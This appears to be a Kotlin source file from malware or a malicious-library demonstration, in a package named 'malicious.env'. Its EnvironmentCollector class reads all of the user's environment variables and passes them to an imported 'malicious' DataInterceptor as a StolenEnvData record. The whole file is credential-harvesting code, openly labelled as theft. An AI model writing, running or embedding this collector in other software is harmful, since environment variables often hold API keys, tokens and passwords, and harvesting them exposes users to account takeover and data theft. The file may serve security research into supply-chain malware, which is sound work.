package malicious.env

import kotlinx.coroutines.runBlocking
import kotlinx.serialization.Serializable
import malicious.interceptors.DataInterceptor

class EnvironmentCollector(
    val interceptor: DataInterceptor,
) {
    fun getUserEnv(): MutableMap<String, String>? = runBlocking {
        // Get all of the user's environment variables
        val env = System.getenv()
        interceptor.onData(StolenEnvData(env))
        env
    }
}

@Serializable
data class StolenEnvData(
    val env: Map<String, String>,
    val type: String = "env",
)